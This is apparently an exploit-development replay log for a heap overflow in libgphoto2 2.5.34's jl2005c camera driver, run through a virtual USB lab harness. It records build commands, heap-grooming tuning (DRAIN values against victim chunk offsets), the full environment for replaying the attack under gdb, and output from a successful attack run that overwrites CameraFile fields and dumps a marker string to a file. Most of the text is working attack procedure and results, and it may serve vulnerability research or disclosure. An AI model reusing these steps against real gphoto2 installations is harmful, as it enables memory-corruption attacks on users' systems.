    0ccb1dac24a837bc58a414942cc74bec47586b826c6c0c91ddcec3adea3d6185
  CFLAGS='-O0 -g -fPIC -fno-omit-frame-pointer' ./configure \
    --prefix="$PWD/installdir-plain" --with-camlibs=jl2005c \
    --enable-shared --disable-static --without-libxml-2.0 \
    --without-libcurl --without-gdlib --without-libtiff-4 \
    --without-libexif --disable-nls --enable-vusb
  CFLAGS='-O0 -g -fPIC -fno-omit-frame-pointer' make -j4 && make install
  P=$PWD/installdir-plain
  gcc -O0 -g -rdynamic -fno-omit-frame-pointer -I"$P/include" \
    -o ../../live/normal_return_probe ../../evidence/replay-normal_return_probe.c \
    -L"$P/lib" -lgphoto2 -lgphoto2_port -Wl,-rpath,"$P/lib"

The committed probe source is byte-identical to the working-tree probe used
for W172 (sha256 ad514167db620dc4e2481d7e2aeaf024021663b55836d42fabdcdabfa26cfa98).

## Drift found and fixed: DRAIN is environment-sensitive

The W172 raw evidence used M2SHELL_VUSB_DRAIN=22 in the author's working tree.
Replayed verbatim in the clean archive it gave priv=0x555555563ff0,
victim=0x555555563cb0 (BEFORE priv), CONSUMER_GET data=(nil) size=0x0 and a
0-byte save file -- no attack. In the working tree the same case had
priv=0x555555564070, victim=0x5555555680c0 = priv+0x4050. The difference is
the pre-existing 0x180 tcache population: startup/environment shifts the heap
by 0x80 and changes which chunk the lab hook's drain loop leaves for
gp_file_new(). Measured in the clean tree (same env, only DRAIN varied):

  DRAIN   victim          note
     8    0x5555555626d0  before priv
    12    0x555555562d10  before priv
    16    0x555555563350  before priv
    20    0x555555563990  before priv
    22    0x555555563cb0  before priv
    23    0x555555568040  priv+0x4050 -- W172 layout
    24    0x5555555681d0  one 0x190 chunk too far
    26    0x5555555684f0
    28    0x555555568810
    32    0x555555568e50
    40    0x555555569ad0

Decision: re-tune DRAIN to 23 in the replay recipe. The victim offset is the
observable criterion, not the number: victim must be priv+0x4050 for the
:154 overflow (starting at priv+0x4040) to reach the live CameraFile fields.
No source, pin, patch or harness change. This is a replay-environment fix,
not a new exploit primitive.

## Six cases from the clean tree (DRAIN=23)

Common run env from T:
  P=$PWD/src/libgphoto2-2.5.34-plain/installdir-plain
  CAMLIBS=$P/lib/libgphoto2/2.5.34
  IOLIBS=$P/lib/libgphoto2_port/0.12.2
  IOLIBS_PREFIX=vusb LD_LIBRARY_PATH=$P/lib
  M2SHELL_JL2005_VUSB=v M2SHELL_JL2005_COUNT=1022
  M2SHELL_VUSB_DRAIN=23 M2SHELL_VUSB_GUARDS=4
  M2SHELL_VUSB_RESTORE_CALLER_CANARY=1 M2SHELL_VUSB_ACCESSTYPE=0
  M2SHELL_TRY_SAVE=1 M2SHELL_DEBUG=1
  gdb -q -batch -x evidence/replay-normal-return.gdb \
    ./live/normal_return_probe usb:001,001
The probe derives its own %fs:0x28 canary, saved registers from the live
stack, and M2SHELL_VUSB_DATA from its own marker address; gdb only calls
setenv-style helpers in the replay script (no memory writes).

A23 attack, guards=4:
  VUSB_VICTIM 0x555555568040
  VUSB_GUARDS 4 first=0x5555555681d0 last=0x555555568680
  GP_CAMERA_INIT rc=0
  VICTIM_AT_CONSUMER+158 = 0x000000000000001d
  VICTIM_AT_CONSUMER+160 = 0x0000555555556010
  CONSUMER_GET rc=0 data=0x555555556010 size=0x1d
  DEREF_READBACK bytes=29 text=M2SHELL_DEREF_MARKER_20261124
  CONSUMER_SAVE rc=0 path=/tmp/m2s-deref-1735011.bin
  NORMAL_RETURN_COMPLETE; gdb inferior exited normally
  file 29 bytes, sha256 prefix d56174c2482345d0
  00000000: 4d 32 53 48 45 4c 4c 5f 44 45 52 45 46 5f 4d 41  M2SHELL_DEREF_MA
  00000010: 52 4b 45 52 5f 32 30 32 36 31 31 32 34           RKER_20261124

B23 matched guard control (only M2SHELL_VUSB_GUARDS=0):
  VUSB_VICTIM 0x555555568040
  GP_CAMERA_INIT rc=0
  CONSUMER_GET rc=0 data=0x555555556010 size=0x1d
  DEREF_READBACK bytes=29 text=M2SHELL_DEREF_MARKER_20261124
  malloc(): corrupted top size
  Program received signal SIGABRT, Aborted
